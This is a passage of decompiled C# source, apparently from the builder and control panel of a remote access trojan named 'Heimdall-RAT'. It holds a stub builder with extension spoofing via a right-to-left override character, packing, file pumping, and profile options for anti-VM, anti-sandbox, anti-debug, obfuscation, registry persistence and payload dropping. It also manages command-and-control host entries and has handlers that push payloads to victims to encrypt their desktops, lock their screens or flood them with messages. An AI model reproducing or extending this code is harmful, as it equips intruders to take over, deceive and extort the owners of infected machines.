					File.Delete(Path.GetDirectoryName(((FileDialog)val).get_FileName()) + "\\" + Path.GetFileNameWithoutExtension(((FileDialog)val).get_FileName()) + Path.GetExtension(((FileDialog)val).get_FileName())!.ToLower() + ".hash");
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (File.Exists("Extensions\\reactor.nrcfg"))
				{
					File.Delete("Extensions\\reactor.nrcfg");
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (RDicon.get_Checked())
				{
					if (iconbox.get_Image() != null)
					{
						Interaction.Shell(Conversions.ToString(Operators.AddObject(Operators.AddObject((object)string.Concat(string.Concat(string.Concat("Extensions\\Resource Hacker -addoverwrite " + ((FileDialog)val).get_FileName(), ","), ((FileDialog)val).get_FileName()), ","), ((Control)iconbox).get_Tag()), (object)", ICONGROUP,1,")), (AppWinStyle)2, false, -1);
					}
					File.Delete(Application.get_StartupPath() + "\\Extensions\\Resource Hacker.ini");
					File.Delete(Application.get_StartupPath() + "\\Extensions\\Resource Hacker.log");
				}
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				if ((CBPRESS.get_Checked() && File.Exists(Application.get_StartupPath() + "\\Extensions\\mpress.exe")) ? true : false)
				{
					try
					{
						ProcessStartInfo processStartInfo3 = new ProcessStartInfo();
						ProcessStartInfo processStartInfo4 = processStartInfo3;
						processStartInfo4.FileName = ((ApplicationBase)MyProject.Application).get_Info().get_DirectoryPath() + "\\Extensions\\mpress.exe";
						processStartInfo4.CreateNoWindow = true;
						processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
						processStartInfo4.Arguments = ((FileDialog)val).get_FileName().ToString() + " -s";
						Process.Start(processStartInfo3)!.WaitForExit();
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				ProjectData.ClearProjectError();
			}
			try
			{
				if ((pumpch.get_Checked() && File.Exists(((FileDialog)val).get_FileName())) ? true : false)
				{
					FileStream fileStream = File.OpenWrite(((FileDialog)val).get_FileName());
					long num = fileStream.Seek(0L, SeekOrigin.End);
					double num2 = default(double);
					if (pumpcb.get_SelectedIndex() == 0)
					{
						num2 = Conversion.Val((object)Pumpv.get_Value()) * 1024.0;
					}
					else if (pumpcb.get_SelectedIndex() == 1)
					{
						num2 = Conversion.Val((object)Pumpv.get_Value()) * 1048576.0;
					}
					else if (pumpcb.get_SelectedIndex() == 2)
					{
						num2 = Conversion.Val((object)Pumpv.get_Value()) * 1073741824.0;
					}
					for (; (double)num < num2; num = checked(num + 1L))
					{
						fileStream.WriteByte(0);
					}
					fileStream.Close();
				}
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
			try
			{
				if ((CBSPOOF.get_Checked() && File.Exists(((FileDialog)val).get_FileName())) ? true : false)
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile(((FileDialog)val).get_FileName(), Path.GetFileNameWithoutExtension(((FileDialog)val).get_FileName()) + "\u202e" + Strings.StrReverse(CSPOOFER.get_Items().get_Item(CSPOOFER.get_SelectedIndex()).ToString()) + ".exe");
				}
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
			Interaction.MsgBox((object)("Done !\r\n" + ((FileDialog)val).get_FileName()), (MsgBoxStyle)0, (object)null);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	public object saveprofile(string pro)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		object result = default(object);
		try
		{
			string text = string.Empty;
			string text2 = string.Empty;
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = hostsports.get_Items().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					text = text + val.get_SubItems().get_Item(0).get_Text() + ",";
					text2 = text2 + val.get_SubItems().get_Item(1).get_Text() + ",";
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			string contents = (text.ToString() + "\r\n" + text2.ToString() + "\r\n" + clientidtextbox.get_Text().ToString() + "\r\n" + mutextxtbox.get_Text().ToString() + "\r\n" + recdelay.get_Value() + "\r\n" + SBSLEEP.get_Checked() + "\r\n" + sleep.get_Value() + "\r\n" + ((Control)Label8).get_Enabled() + "\r\n" + ANTIVM.get_Checked() + "\r\n" + ANTISB.get_Checked() + "\r\n" + ANTIW.get_Checked() + "\r\n" + ANTID.get_Checked() + "\r\n" + ANTIE.get_Checked() + "\r\n" + CBPROPRI.get_Checked() + "\r\n" + CBPROPRIO.get_SelectedIndex() + "\r\n" + CBRAND.get_Checked() + "\r\n" + Obfu.get_Checked() + "\r\n" + STEN.get_Checked() + "\r\n" + ANIL.get_Checked() + "\r\n" + ATAM.get_Checked() + "\r\n" + OPT.get_Checked() + "\r\n" + CBHIDEE.get_Checked() + "\r\n" + CBMSG.get_Checked() + "\r\n" + MSGB.get_Text() + "\r\n" + MSGT.get_Text() + "\r\n" + MSGBUTTON.get_SelectedIndex() + "\r\n" + MSGICON.get_SelectedIndex() + "\r\n" + CBdrop.get_Checked() + "\r\n" + CDP.get_SelectedIndex() + "\r\n" + TBDN.get_Text() + "\r\n" + CBSEXE.get_Checked() + "\r\n" + TBSEXE.get_Text() + "\r\n" + CBURL.get_Checked() + "\r\n" + TBURL.get_Text() + "\r\n" + CBJS.get_Checked() + "\r\n" + TBJS.get_Text() + "\r\n" + CBVBS.get_Checked() + "\r\n" + TBVBS.get_Text() + "\r\n" + CBREG.get_Checked() + "\r\n" + TBRK.get_Text() + "\r\n" + TBRV.get_Text() + "\r\n" + CBST.get_Checked() + "\r\n" + TBSTN.get_Text() + "\r\n" + TBSTT.get_Value() + "\r\n" + RBnoicon.get_Checked() + "\r\n" + CBass.get_Checked() + "\r\n" + ass1.get_Text() + "\r\n" + ass2.get_Text() + "\r\n" + ass3.get_Text() + "\r\n" + ass4.get_Text() + "\r\n" + ass5.get_Text() + "\r\n" + ass6.get_Text() + "\r\n" + ass7.get_Text() + "\r\n" + ass8.get_Text() + "\r\n" + CBSPOOF.get_Checked() + "\r\n" + CSPOOFER.get_SelectedIndex() + "\r\n" + CBPRESS.get_Checked() + "\r\n" + pumpch.get_Checked() + "\r\n" + Pumpv.get_Value() + "\r\n" + pumpcb.get_SelectedIndex()).ToString();
			File.WriteAllText(Application.get_StartupPath() + "\\Profiles\\" + pro + ".ini", contents);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public object loadprofile(string pro)
	{
		checked
		{
			object result = default(object);
			try
			{
				if (!File.Exists("Profiles\\" + pro + ".ini"))
				{
					File.WriteAllText(Application.get_StartupPath() + "\\Profiles\\" + pro + ".ini", "");
				}
				string[] array = Strings.Split(File.ReadAllText("Profiles\\" + pro + ".ini"), "\r\n", -1, (CompareMethod)0);
				string[] array2 = Strings.Split(array[0], ",", -1, (CompareMethod)0);
				string[] array3 = Strings.Split(array[1], ",", -1, (CompareMethod)0);
				hostsports.get_Items().Clear();
				int num = array2.Length - 1;
				int num2 = 0;
				while (true)
				{
					int num3 = num2;
					int num4 = num;
					if (num3 > num4)
					{
						break;
					}
					hostsports.get_Items().Add(array2[num2], 0).get_SubItems()
						.Add(array3[num2]);
					num2++;
					num2 += 0;
				}
				clientidtextbox.set_Text(array[2].ToString());
				mutextxtbox.set_Text(array[3].ToString());
				recdelay.set_Value(Convert.ToDecimal(array[4].ToString()));
				SBSLEEP.set_Checked(Convert.ToBoolean(array[5].ToString()));
				sleep.set_Value(Convert.ToDecimal(array[6].ToString()));
				((Control)Label8).set_Enabled(Convert.ToBoolean(array[7].ToString()));
				ANTIVM.set_Checked(Convert.ToBoolean(array[8].ToString()));
				ANTISB.set_Checked(Convert.ToBoolean(array[9].ToString()));
				ANTIW.set_Checked(Convert.ToBoolean(array[10].ToString()));
				ANTID.set_Checked(Convert.ToBoolean(array[11].ToString()));
				ANTIE.set_Checked(Convert.ToBoolean(array[12].ToString()));
				CBPROPRI.set_Checked(Convert.ToBoolean(array[13].ToString()));
				CBPROPRIO.set_SelectedIndex(int.Parse(array[14].ToString()));
				CBRAND.set_Checked(Convert.ToBoolean(array[15].ToString()));
				Obfu.set_Checked(Convert.ToBoolean(array[16].ToString()));
				STEN.set_Checked(Convert.ToBoolean(array[17].ToString()));
				ANIL.set_Checked(Convert.ToBoolean(array[18].ToString()));
				ATAM.set_Checked(Convert.ToBoolean(array[19].ToString()));
				OPT.set_Checked(Convert.ToBoolean(array[20].ToString()));
				CBHIDEE.set_Checked(Convert.ToBoolean(array[21]));
				CBMSG.set_Checked(Convert.ToBoolean(array[22]));
				MSGB.set_Text(array[23]);
				MSGT.set_Text(array[24]);
				MSGBUTTON.set_SelectedIndex(int.Parse(array[25]));
				MSGICON.set_SelectedIndex(int.Parse(array[26]));
				CBdrop.set_Checked(Convert.ToBoolean(array[27]));
				CDP.set_SelectedIndex(int.Parse(array[28]));
				TBDN.set_Text(array[29].ToString());
				CBSEXE.set_Checked(Convert.ToBoolean(array[30].ToString()));
				TBSEXE.set_Text(array[31].ToString());
				CBURL.set_Checked(Convert.ToBoolean(array[32].ToString()));
				TBURL.set_Text(array[33].ToString());
				CBJS.set_Checked(Convert.ToBoolean(array[34].ToString()));
				TBJS.set_Text(array[35].ToString());
				CBVBS.set_Checked(Convert.ToBoolean(array[36].ToString()));
				TBVBS.set_Text(array[37].ToString());
				CBREG.set_Checked(Convert.ToBoolean(array[38].ToString()));
				TBRK.set_Text(array[39].ToString());
				TBRV.set_Text(array[40].ToString());
				CBST.set_Checked(Convert.ToBoolean(array[41].ToString()));
				TBSTN.set_Text(array[42].ToString());
				TBSTT.set_Value(Convert.ToDecimal(array[43].ToString()));
				RBnoicon.set_Checked(Convert.ToBoolean(array[44].ToString()));
				CBass.set_Checked(Convert.ToBoolean(array[45].ToString()));
				ass1.set_Text(array[46].ToString());
				ass2.set_Text(array[47].ToString());
				ass3.set_Text(array[48].ToString());
				ass4.set_Text(array[49].ToString());
				ass5.set_Text(array[50].ToString());
				ass6.set_Text(array[51].ToString());
				ass7.set_Text(array[52].ToString());
				ass8.set_Text(array[53].ToString());
				CBSPOOF.set_Checked(Convert.ToBoolean(array[54].ToString()));
				CSPOOFER.set_SelectedIndex(int.Parse(array[55].ToString()));
				CBPRESS.set_Checked(Convert.ToBoolean(array[56].ToString()));
				pumpch.set_Checked(Convert.ToBoolean(array[57].ToString()));
				Pumpv.set_Value(Convert.ToDecimal(array[58].ToString()));
				pumpcb.set_SelectedIndex(int.Parse(array[59].ToString()));
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private void Button7_Click(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		((Form)MyProject.Forms.SSGR).ShowDialog();
	}

	private void Button3_Click_1(object sender, EventArgs e)
	{
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Application.get_StartupPath() + "\\Profiles\\"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().CreateDirectory(Application.get_StartupPath() + "\\Profiles\\");
		}
		File.WriteAllText(Application.get_StartupPath() + "\\Profiles\\Default.ini", Resources._Default);
		loadprofile("Default");
	}

	private void Button4_Click_2(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		((Form)MyProject.Forms.ProLGR).ShowDialog();
	}

	private void AddToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		string text = Interaction.InputBox("Add a new connection", "Heimdall-RAT ", "127.0.0.1:6969", -1, -1);
		if (Operators.CompareString(text, "", false) == 0)
		{
			MessageBox.Show("you must add your host or ip!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		string[] array = Strings.Split(text, ":", -1, (CompareMethod)0);
		if (Operators.CompareString(array[0], "", false) == 0)
		{
			MessageBox.Show("you must add your host or ip!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else if (Operators.CompareString(array[1], "", false) == 0)
		{
			MessageBox.Show("you must add your port!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else
		{
			hostsports.get_Items().Add(array[0], 0).get_SubItems()
				.Add(array[1]);
		}
	}

	private void EditToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = hostsports.get_SelectedItems().GetEnumerator();
				while (true)
				{
					if (enumerator.MoveNext())
					{
						ListViewItem val = (ListViewItem)enumerator.Current;
						string text = Interaction.InputBox("edit connection", "Heimdall-RAT ", val.get_SubItems().get_Item(0).get_Text() + ":" + val.get_SubItems().get_Item(1).get_Text(), -1, -1);
						if (Operators.CompareString(text, "", false) != 0)
						{
							string[] array = Strings.Split(text, ":", -1, (CompareMethod)0);
							if (Operators.CompareString(array[0], "", false) != 0)
							{
								if (Operators.CompareString(array[1], "", false) == 0)
								{
									break;
								}
								val.get_SubItems().get_Item(0).set_Text(array[0]);
								val.get_SubItems().get_Item(1).set_Text(array[1]);
								continue;
							}
							MessageBox.Show("you must add your host or ip!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
							return;
						}
						MessageBox.Show("you must add your host or ip!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
						return;
					}
					return;
				}
				MessageBox.Show("you must add your port!", "Heimdall-RAT ", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void RemoveToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = hostsports.get_SelectedItems().GetEnumerator();
			while (enumerator.MoveNext())
			{
				ListViewItem val = (ListViewItem)enumerator.Current;
				val.Remove();
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	private void EncryptDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "True" + Key + Functions.GenRandom(1, 10) + ".tmp.exe" + Key + Convert.ToBase64String(Resources.EncLock) + Key + "False");
					val.set_Tag((object)"0");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void DecryptDESKTOPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "True" + Key + Functions.GenRandom(1, 10) + ".tmp.exe" + Key + Convert.ToBase64String(Resources.DecLock) + Key + "False");
					val.set_Tag((object)"0");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void TestToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					val.set_Tag((object)"0");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void LockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable2(0, 1) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable2(0, 1) + Key + Functions.RandomVariable2(0, 1) + Key + "False" + Key + "True" + Key + Functions.GenRandom2(0, 1) + ".tmp.exe" + Key + Convert.ToBase64String(Resources.LockScreen) + Key + "False");
					val.set_Tag((object)"0");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void UnlockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "True" + Key + Functions.GenRandom(1, 10) + ".tmp.exe" + Key + Convert.ToBase64String(Resources.UnlockScreen) + Key + "False");
					val.set_Tag((object)"0");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void StartInfinityMessagesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable3(0, 1) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable3(1, 2) + Key + Functions.RandomVariable3(0, 1) + Key + "False" + Key + "True" + Key + Functions.GenRandom3(0, 1) + ".tmp.exe" + Key + Convert.ToBase64String(Resources.Inf) + Key + "False");
					val.set_Tag((object)"0");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void StopInfinityMessagesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_01cd: Unknown result type (might be due to invalid IL or missing references)
		if (listV1.get_SelectedItems().get_Count() <= 0)
		{
			return;
		}
		try
		{
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = listV1.get_SelectedItems().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem val = (ListViewItem)enumerator.Current;
					val.set_Tag((object)"Pause");
					s.Send(Conversions.ToInteger(val.get_ToolTipText()), "UNV" + Key + URC + Key + "UNI.UNI" + Key + Functions.RandomVariable(5, 8) + Key + "False" + Key + "False" + Key + "False" + Key + Functions.RandomVariable(1, 5) + Key + Functions.RandomVariable(1, 5) + Key + "False" + Key + "True" + Key + Functions.GenRandom(1, 10) + ".tmp.exe" + Key + Convert.ToBase64String(Resources.StopInfM) + Key + "False");
					val.set_Tag((object)"0");
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show("Erreur : " + ex2.Message, "Heimdall RAT ", (MessageBoxButtons)0, (MessageBoxIcon)16);
			ProjectData.ClearProjectError();
		}
	}

	private void ClearListToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		try
		{
			hostsports.get_Items().Clear();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void listV1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}
}
